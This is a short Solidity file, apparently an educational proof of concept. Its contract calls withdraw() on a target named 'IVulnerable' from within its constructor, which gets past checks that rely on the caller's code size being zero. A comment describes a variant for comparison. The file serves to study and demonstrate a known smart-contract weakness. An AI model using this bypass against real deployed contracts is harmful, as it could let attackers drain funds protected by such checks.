// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

interface IVulnerable{
    function withdraw() external;
}

contract SizeZeroContract {
    constructor(address _address){
        IVulnerable(_address).withdraw();
    }


    // @notice To know how the vulnerable contract would behave, uncomment this 
    // function, comment out line 13 and remove the address parameter from constructor

    // function withdraw(address _address) public {
    //     IVulnerable(_address).withdraw();
    // }
}
